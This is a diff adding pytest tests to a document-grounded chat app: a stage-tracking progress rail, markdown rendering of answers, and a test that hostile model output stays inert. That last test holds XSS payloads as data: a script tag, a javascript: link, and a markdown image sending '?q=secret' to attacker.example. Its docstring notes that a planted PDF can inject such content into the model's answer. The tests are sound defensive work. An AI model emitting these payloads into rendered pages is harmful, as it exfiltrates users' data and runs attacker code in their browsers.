@@ -433,6 +433,42 @@ def test_the_loading_state_names_the_stage_the_agent_is_really_in(
     _settled(client, runtime, workspace.id)
 
 
+@pytest.mark.parametrize(
+    ("port", "current", "done"),
+    [
+        ("summarize", "preparing", ()),
+        ("retrieve", "searching", ("preparing",)),
+        ("grade", "checking", ("preparing", "searching")),
+        ("write_answer", "writing", ("preparing", "searching", "checking")),
+    ],
+)
+def test_the_step_rail_marks_the_real_stage_current_and_only_earlier_ones_done(
+    sanad, port, current, done
+):
+    """S6 waiting animation. The same held-port method as the label test
+    above, for the same reason: a rail advanced by a timer would light the
+    same steps in all four rows."""
+    build, workspace, _ = sanad
+    gate = Gate()
+    client, runtime = build()
+    _hold(runtime, gate, port)
+
+    client.post("/chat/ask", data={"question": QUESTION}, follow_redirects=False)
+    assert gate.reached.wait(WAIT), f"the run never entered {port}"
+    page = client.get("/").text
+
+    assert f'data-stage-key="{current}"' in page
+    rail = page.split("data-stepper>")[1].split("</ol>")[0]
+    steps = re.findall(r'class="stepper__step([^"]*)"\s+data-step="(\w+)"', rail)
+    assert [name for _, name in steps] == ["preparing", "searching", "checking", "writing"]
+    for classes, name in steps:
+        assert ("is-current" in classes) == (name == current), (name, classes)
+        assert ("is-done" in classes) == (name in done), (name, classes)
+
+    gate.release.set()
+    _settled(client, runtime, workspace.id)
+
+
 def test_the_question_appears_before_any_answer_does(sanad):
     """The user variant (UX spec 6.2), and the reason it is appended by
     the route rather than by the worker: the transcript must show what was
@@ -1131,7 +1167,53 @@ def test_an_arabic_answer_gets_dir_auto_and_lang_ar_while_the_french_question_do
     assert 'class="bubble bubble--user" dir="auto">' in page, (
         "the French user bubble must still carry dir=auto (item 1), just not lang=ar"
     )
-    assert f'class="answer__text" dir="auto" lang="ar">{arabic_answer}' in _visible(page)
+    assert (
+        f'class="answer__text prose" dir="auto" lang="ar"><p dir="auto">{arabic_answer}</p>'
+        in _visible(page)
+    )
+
+
+def test_an_answer_with_bold_and_a_list_renders_formatted_not_as_symbols(sanad):
+    """S6. The answer-writer prompt invites a short list, so the model
+    really sends `**` and `- `. Before S6 the reader saw those characters."""
+    build, workspace, _ = sanad
+    formatted = (
+        "**Periode d'essai** pour les cadres :\n\n"
+        "- trois mois\n"
+        "- renouvelable une seule fois"
+    )
+    client, runtime = build(model=ScriptedChat(QUERY_PLAN, "RELEVANT", formatted))
+
+    _ask(client)
+    page = _settled(client, runtime, workspace.id)
+    answer = page.split('class="answer__text prose"')[1].split("</div>")[0]
+
+    assert "<strong>Periode d" in answer
+    assert '<li dir="auto">trois mois</li>' in answer
+    assert "**" not in answer
+    assert "- trois mois" not in _visible(answer)
+
+
+def test_a_hostile_answer_cannot_run_script_load_an_image_or_add_a_link(sanad):
+    """The answer is written from the operator's documents, so a planted
+    PDF can put anything in it. None of it may become live markup."""
+    build, workspace, _ = sanad
+    hostile = (
+        "<script>alert('x')</script> "
+        "![leak](https://attacker.example/?q=secret) "
+        "[open](javascript:alert(1))"
+    )
+    client, runtime = build(model=ScriptedChat(QUERY_PLAN, "RELEVANT", hostile))
+
+    _ask(client)
+    page = _settled(client, runtime, workspace.id)
+    answer = page.split('class="answer__text prose"')[1].split("</div>")[0]
+
+    assert "<script" not in answer
+    assert "&lt;script&gt;" in answer
+    assert "<img" not in answer
+    assert "<a " not in answer
+    assert "attacker.example" in answer, "the text stays visible, just inert"
 
 
 def test_a_question_containing_markup_is_shown_as_text_not_run_as_markup(sanad):
